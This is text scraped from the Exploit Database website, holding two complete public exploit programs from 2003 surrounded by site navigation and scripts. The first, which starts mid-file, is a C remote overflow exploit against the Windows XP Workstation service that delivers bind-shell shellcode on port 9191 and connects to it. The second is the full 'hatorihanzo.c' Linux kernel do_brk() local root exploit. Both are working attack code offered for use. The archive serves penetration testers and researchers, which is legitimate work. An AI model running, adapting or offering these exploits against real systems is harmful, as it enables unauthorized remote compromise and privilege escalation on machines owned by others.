// 0x77d6754a(user32.dll){ "Window XP + SP0 + Rollup [Rus]   ", 0x77f98db7 },  //0x77d639ab-work 0x77fb59cc - sp1{ "Window XP + SP1 [Rus]            ", 0x77fb59cc },{ "Window XP + SP1 + Rollup [Rus]   ", 0x77f9980f },  // 0x77d637db(user32.dll){ "Crash all                ", 0x41424344 }}, tgt_type;unsigned char shellcode[] = // bind shell at 9191 port (484 bytes) // ripped =)"\xEB\x03\x5D\xEB\x05\xE8\xF8\xFF\xFF\xFF\x8B\xC5\x83\xC0\x11\x33""\xC9\x66\xB9\xC9\x01\x80\x30\x88\x40\xE2\xFA\xDD\x03\x64\x03\x7C""\x09\x64\x08\x88\x88\x88\x60\xC4\x89\x88\x88\x01\xCE\x74\x77\xFE""\x74\xE0\x06\xC6\x86\x64\x60\xD9\x89\x88\x88\x01\xCE\x4E\xE0\xBB""\xBA\x88\x88\xE0\xFF\xFB\xBA\xD7\xDC\x77\xDE\x4E\x01\xCE\x70\x77""\xFE\x74\xE0\x25\x51\x8D\x46\x60\xB8\x89\x88\x88\x01\xCE\x5A\x77""\xFE\x74\xE0\xFA\x76\x3B\x9E\x60\xA8\x89\x88\x88\x01\xCE\x46\x77""\xFE\x74\xE0\x67\x46\x68\xE8\x60\x98\x89\x88\x88\x01\xCE\x42\x77""\xFE\x70\xE0\x43\x65\x74\xB3\x60\x88\x89\x88\x88\x01\xCE\x7C\x77""\xFE\x70\xE0\x51\x81\x7D\x25\x60\x78\x88\x88\x88\x01\xCE\x78\x77""\xFE\x70\xE0\x2C\x92\xF8\x4F\x60\x68\x88\x88\x88\x01\xCE\x64\x77""\xFE\x70\xE0\x2C\x25\xA6\x61\x60\x58\x88\x88\x88\x01\xCE\x60\x77""\xFE\x70\xE0\x6D\xC1\x0E\xC1\x60\x48\x88\x88\x88\x01\xCE\x6A\x77""\xFE\x70\xE0\x6F\xF1\x4E\xF1\x60\x38\x88\x88\x88\x01\xCE\x5E\xBB""\x77\x09\x64\x7C\x89\x88\x88\xDC\xE0\x89\x89\x88\x88\x77\xDE\x7C""\xD8\xD8\xD8\xD8\xC8\xD8\xC8\xD8\x77\xDE\x78\x03\x50\xDF\xDF\xE0""\x8A\x88\xAB\x6F\x03\x44\xE2\x9E\xD9\xDB\x77\xDE\x64\xDF\xDB\x77""\xDE\x60\xBB\x77\xDF\xD9\xDB\x77\xDE\x6A\x03\x58\x01\xCE\x36\xE0""\xEB\xE5\xEC\x88\x01\xEE\x4A\x0B\x4C\x24\x05\xB4\xAC\xBB\x48\xBB""\x41\x08\x49\x9D\x23\x6A\x75\x4E\xCC\xAC\x98\xCC\x76\xCC\xAC\xB5""\x01\xDC\xAC\xC0\x01\xDC\xAC\xC4\x01\xDC\xAC\xD8\x05\xCC\xAC\x98""\xDC\xD8\xD9\xD9\xD9\xC9\xD9\xC1\xD9\xD9\x77\xFE\x4A\xD9\x77\xDE""\x46\x03\x44\xE2\x77\x77\xB9\x77\xDE\x5A\x03\x40\x77\xFE\x36\x77""\xDE\x5E\x63\x16\x77\xDE\x9C\xDE\xEC\x29\xB8\x88\x88\x88\x03\xC8""\x84\x03\xF8\x94\x25\x03\xC8\x80\xD6\x4A\x8C\x88\xDB\xDD\xDE\xDF""\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D\xF0\x8B\x5D\x03\xC2\x90""\x03\xD2\xA8\x8B\x55\x6B\xBA\xC1\x03\xBC\x03\x8B\x7D\xBB\x77\x74""\xBB\x48\x24\xB2\x4C\xFC\x8F\x49\x47\x85\x8B\x70\x63\x7A\xB3\xF4""\xAC\x9C\xFD\x69\x03\xD2\xAC\x8B\x55\xEE\x03\x84\xC3\x03\xD2\x94""\x8B\x55\x03\x8C\x03\x8B\x4D\x63\x8A\xBB\x48\x03\x5D\xD7\xD6\xD5""\xD3\x4A\x8C\x88";/***************************************************************/void banner() {printf("\nWKS service remote exploit by fiNis (fiNis[at]bk[dot]ru), ver:%s\n",VER);printf(  "-------------------------------------------------------------------\n");}void showtargets() {int i;printf("Possible targets are:\n");printf("============================\n");for (i=0;i<sizeof(targets)/sizeof(tgt_type);i++) {printf("%d) %s\n",i+1,targets[i].os);}exit(1);}void usage(char *prog) {banner();printf("Usage: %s [-ht]\n", prog);printf("\t-h <IP>    : Target IP\n");printf("\t-t <Type>  : Target type (-t0 for a list)\n");exit(1);}/***************************************************************/long gimmeip(char *hostname){struct hostent *he;long ipaddr;if ((ipaddr = inet_addr(hostname)) < 0){if ((he = gethostbyname(hostname)) == NULL){printf("[x] Failed to resolve host: %s! Exiting...\n\n",hostname);WSACleanup();exit(1);}memcpy(&ipaddr, he->h_addr, he->h_length);}return ipaddr;}// ************************************* CMD *****************************/** Ripped from TESO code and modifed by ey4s for win32*/void cmdshell2(int sock) {int l;char buf[1000];struct timeval time;unsigned long ul[2];time.tv_sec=RECVTIMEOUT;time.tv_usec=0;while (1) {ul[0]=1;ul[1]=sock;l=select(0,(fd_set *)&ul,NULL,NULL,&time);if(l==1) {l=recv(sock,buf,sizeof(buf),0);if (l<=0) {printf("[x] Connection closed.\n");return;}l=write(1,buf,l);if (l<=0) {printf("[x] Connection closed.\n");return;}}else {l=read(0,buf,sizeof(buf));if (l<=0) {printf("[x] Connection closed.\n");return;}l=send(sock,buf,l,0);if (l<=0) {printf("[x] Connection closed.\n");return;}}}}/****************************************************************/void send_exp() {NETRESOURCE _IPC_;_IPC_.lpLocalName = NULL;_IPC_.lpProvider = NULL;_IPC_.dwType = RESOURCETYPE_ANY;_IPC_.lpRemoteName = (char*)&ipc;printf("[+] Setting up IPC$ session...\n");if (WNetAddConnection2(&_IPC_,"","",0)!=ERROR_SUCCESS) {printf("[x] Couldn't establish IPC$ connection.\n");exit (1);}printf("[*] IPC$ session setup successfully!\n");printf("[+] Sending exploit ...\n");NetAddAlternateComputerName(tgt_net_uni, expl_uni ,NULL,NULL,0);// ka-a-a b0-0-0-ms //}// ***************************************************************int main(int argc,char *argv[]){WSADATA wsdata;int sock;unsigned short port = 9191;struct sockaddr_in target;unsigned long ip;char opt;int tgt_type = 0;char *tgt_host;if (argc<2) { usage(argv[0]); }while((opt = getopt(argc,argv,"h:t:v"))!=EOF) {switch(opt){case 'h':tgt_host = optarg;snprintf(tgt_net,127, "\\\\%s", optarg);snprintf(ipc,127, "\\\\%s\\ipc$", optarg);break;case 't':tgt_type = atoi(optarg);if (tgt_type == 0 || tgt_type > sizeof(targets) / 8) {showtargets();}break;default:usage(argv[0]);break;}}printf("\n[+] Prepare exploit string\n");memset(expl, 0x00, sizeof(expl));memset(expl, 0x41, 2064);memcpy(&expl[2044], (unsigned char *) &targets[tgt_type-1].jmpesp, 4);//memcpy(&expl[2044], "BBBB", 4);memcpy(&expl[2064], shellcode, sizeof(shellcode));		// begin shellcode herememset(expl_uni, 0x00, sizeof(expl_uni));memset(tgt_net_uni, 0x00, sizeof(tgt_net_uni));mbstowcs(tgt_net_uni, tgt_net, sizeof(tgt_net));switch(tgt_type) {case 1:case 3:MultiByteToWideChar(CP_ACP, 0, expl, sizeof(expl), (unsigned short *)expl_uni,sizeof(expl_uni));// MultiByteToWideChar - 100 % work at XP+SP0+Rollupbreak;case 2:mbstowcs(expl_uni, expl, sizeof(expl)); // work at XP+SP1break;default:mbstowcs(expl_uni, expl, sizeof(expl));break;}beginthread(send_exp,0,NULL);printf("[+] Sleep at 2s ... \n");sleep(2000);if (WSAStartup(MAKEWORD(2,0),&wsdata)!=0) {printf("[x] WSAStartup error...\n");WSACleanup();return 1;}printf("[+] Initialize WSAStartup - OK\n");if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {printf("[x] Socket not initialized! Exiting...\n");WSACleanup();return 1;}printf("[*] Socket initialized - OK\n");ip=gimmeip(tgt_host);memset(&target, 0, sizeof(target));target.sin_family=AF_INET;target.sin_addr.s_addr = ip;target.sin_port=htons(port);printf("[+] Try connecting to %s:%d ...\n",tgt_host,port);if(connect(sock,(struct sockaddr *)&target, sizeof(target))!=0) {printf("\n[x] Exploit failed or is Filtred. Exiting...\n");WSACleanup();exit(1);}printf("[*] Connected to shell at %s:%d\n\n",inet_ntoa(target.sin_addr),port);cmdshell2(sock);closesocket(sock);WSACleanup();return 0;}// milw0rm.com [2003-12-04]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 131
Linux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation (2) - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation (2)EDB-ID:131CVE:2003-0961EDB Verified:Author:Wojciech PurczynskiType:localExploit:/Platform:LinuxDate:2003-12-05Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** hatorihanzo.c* Linux kernel do_brk vma overflow exploit.** The bug was found by Paul (IhaQueR) Starzetz <paul@isec.pl>** Further research and exploit development by* Wojciech Purczynski <cliph@isec.pl> and Paul Starzetz.** (c) 2003 Copyright by IhaQueR and cliph. All Rights Reserved.** COPYING, PRINTING, DISTRIBUTION, MODIFICATION, COMPILATION AND ANY USE* OF PRESENTED CODE IS STRICTLY PROHIBITED.*/#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <errno.h>#include <string.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <paths.h>#include <grp.h>#include <setjmp.h>#include <stdint.h>#include <sys/mman.h>#include <sys/ipc.h>#include <sys/shm.h>#include <sys/ucontext.h>#include <sys/wait.h>#include <asm/ldt.h>#include <asm/page.h>#include <asm/segment.h>#include <linux/unistd.h>#include <linux/linkage.h>#define kB * 1024#define MB * 1024 kB#define GB * 1024 MB#define MAGIC 0xdefaced /* I should've patented this number -cliph */#define ENTRY_MAGIC 0#define ENTRY_GATE 2#define ENTRY_CS 4#define ENTRY_DS 6#define CS ((ENTRY_CS << 2) | 4)#define DS ((ENTRY_DS << 2) | 4)#define GATE ((ENTRY_GATE << 2) | 4 | 3)#define LDT_PAGES ((LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1) / PAGE_SIZE)#define TOP_ADDR 0xFFFFE000U/* configuration */unsigned task_size;unsigned page;uid_t uid;unsigned address;int dontexit = 0;void fatal(char * msg){fprintf(stderr, "[-] %s: %s\n", msg, strerror(errno));if (dontexit) {fprintf(stderr, "[-] Unable to exit, entering neverending loop.\n");kill(getpid(), SIGSTOP);for (;;) pause();}exit(EXIT_FAILURE);}void configure(void){unsigned val;task_size = ((unsigned)&val + 1 GB ) / (1 GB) * 1 GB;uid = getuid();}void expand(void){unsigned top = (unsigned) sbrk(0);unsigned limit = address + PAGE_SIZE;do {if (sbrk(PAGE_SIZE) == NULL)fatal("Kernel seems not to be vulnerable");dontexit = 1;top += PAGE_SIZE;} while (top < limit);}jmp_buf jmp;#define MAP_NOPAGE 1#define MAP_ISPAGE 2void sigsegv(int signo, siginfo_t * si, void * ptr){struct ucontext * uc = (struct ucontext *) ptr;int error_code = uc->uc_mcontext.gregs[REG_ERR];(void)signo;(void)si;error_code = MAP_NOPAGE + (error_code & 1);longjmp(jmp, error_code);}void prepare(void){struct sigaction sa;sa.sa_sigaction = sigsegv;sa.sa_flags = SA_SIGINFO | SA_NOMASK;sigemptyset(&sa.sa_mask);sigaction(SIGSEGV, &sa, NULL);}int testaddr(unsigned addr){int val;val = setjmp(jmp);if (val == 0) {asm ("verr (%%eax)" : : "a" (addr));return MAP_ISPAGE;}return val;}#define map_pages (((TOP_ADDR - task_size) + PAGE_SIZE - 1) / PAGE_SIZE)#define map_size (map_pages + 8*sizeof(unsigned) - 1) / (8*sizeof(unsigned))#define next(u, b) do { if ((b = 2*b) == 0) { b = 1; u++; } } while(0)void map(unsigned * map){unsigned addr = task_size;unsigned bit = 1;prepare();while (addr < TOP_ADDR) {if (testaddr(addr) == MAP_ISPAGE)*map |= bit;addr += PAGE_SIZE;next(map, bit);}signal(SIGSEGV, SIG_DFL);}void find(unsigned * m){unsigned addr = task_size;unsigned bit = 1;unsigned count;unsigned tmp;prepare();tmp = address = count = 0U;while (addr < TOP_ADDR) {int val = testaddr(addr);if (val == MAP_ISPAGE && (*m & bit) == 0) {if (!tmp) tmp = addr;count++;} else {if (tmp && count == LDT_PAGES) {errno = EAGAIN;if (address)fatal("double allocation\n");address = tmp;}tmp = count = 0U;}addr += PAGE_SIZE;next(m, bit);}signal(SIGSEGV, SIG_DFL);if (address)return;errno = ENOTSUP;fatal("Unable to determine kernel address");}int modify_ldt(int, void *, unsigned);void ldt(unsigned * m){struct modify_ldt_ldt_s l;map(m);memset(&l, 0, sizeof(l));l.entry_number = LDT_ENTRIES - 1;l.seg_32bit = 1;l.base_addr = MAGIC >> 16;l.limit = MAGIC & 0xffff;if (modify_ldt(1, &l, sizeof(l)) == -1)fatal("Unable to set up LDT");l.entry_number = ENTRY_MAGIC / 2;if (modify_ldt(1, &l, sizeof(l)) == -1)fatal("Unable to set up LDT");find(m);}asmlinkage void kernel(unsigned * task){unsigned * addr = task;/* looking for uids */while (addr[0] != uid || addr[1] != uid ||addr[2] != uid || addr[3] != uid)addr++;addr[0] = addr[1] = addr[2] = addr[3] = 0; /* uids */addr[4] = addr[5] = addr[6] = addr[7] = 0; /* uids */addr[8] = 0;/* looking for vma */for (addr = (unsigned *) task_size; addr; addr++) {if (addr[0] >= task_size && addr[1] < task_size &&addr[2] == address && addr[3] >= task_size) {addr[2] = task_size - PAGE_SIZE;addr = (unsigned *) addr[3];addr[1] = task_size - PAGE_SIZE;addr[2] = task_size;break;}}}void kcode(void);#define __str(s) #s#define str(s) __str(s)void __kcode(void){asm("kcode: \n"" pusha \n"" pushl %es \n"" pushl %ds \n"" movl $(" str(DS) ") ,%edx \n"" movl %edx,%es \n"" movl %edx,%ds \n"" movl $0xffffe000,%eax \n"" andl %esp,%eax \n"" pushl %eax \n"" call kernel \n"" addl $4, %esp \n"" popl %ds \n"" popl %es \n"" popa \n"" lret \n");}void knockout(void){unsigned * addr = (unsigned *) address;if (mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE) == -1)fatal("Unable to change page protection");errno = ESRCH;if (addr[ENTRY_MAGIC] != MAGIC)fatal("Invalid LDT entry");/* setting call gate and privileged descriptors */addr[ENTRY_GATE+0] = ((unsigned)CS << 16) | ((unsigned)kcode & 0xffffU);addr[ENTRY_GATE+1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;addr[ENTRY_CS+0] = 0x0000ffffU; /* kernel 4GB code at 0x00000000 */addr[ENTRY_CS+1] = 0x00cf9a00U;addr[ENTRY_DS+0] = 0x0000ffffU; /* user 4GB code at 0x00000000 */addr[ENTRY_DS+1] = 0x00cf9200U;prepare();if (setjmp(jmp) != 0) {errno = ENOEXEC;fatal("Unable to jump to call gate");}asm("lcall $" str(GATE) ",$0x0"); /* this is it */}void shell(void){char * argv[] = { _PATH_BSHELL, NULL };execve(_PATH_BSHELL, argv, environ);fatal("Unable to spawn shell\n");}void remap(void){static char stack[8 MB]; /* new stack */static char * envp[] = { "PATH=" _PATH_STDPATH, NULL };static unsigned * m;static unsigned b;m = (unsigned *) sbrk(map_size);if (!m)fatal("Unable to allocate memory");environ = envp;asm ("movl %0, %%esp\n" : : "a" (stack + sizeof(stack)));b = ((unsigned)sbrk(0) + PAGE_SIZE - 1) & PAGE_MASK;if (munmap((void*)b, task_size - b) == -1)fatal("Unable to unmap stack");while (b < task_size) {if (sbrk(PAGE_SIZE) == NULL)fatal("Unable to expand BSS");b += PAGE_SIZE;}ldt(m);expand();knockout();shell();}int main(void){configure();remap();return EXIT_FAILURE;}// milw0rm.com [2003-12-05]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 